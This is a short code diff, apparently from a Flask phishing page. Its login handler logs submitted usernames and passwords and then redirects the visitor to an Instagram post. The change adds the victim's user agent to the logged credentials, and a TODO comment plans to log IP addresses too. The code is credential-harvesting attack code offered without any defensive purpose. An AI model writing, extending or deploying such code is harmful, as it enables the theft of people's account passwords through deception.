@@ -19,7 +19,7 @@ def login():
         abort(400)
     if not request.form['password']:
         abort(400)
-    log_credentials(request.form['username'], request.form['password'], None)      # TODO: Make this log IP Addr
+    log_credentials(request.form['username'], request.form['password'], None, request.user_agent)      # TODO: Make this log IP Addr
     return redirect('https://www.instagram.com/p/NdYIBT9hYfq6yfzrf8Zr')
 
 
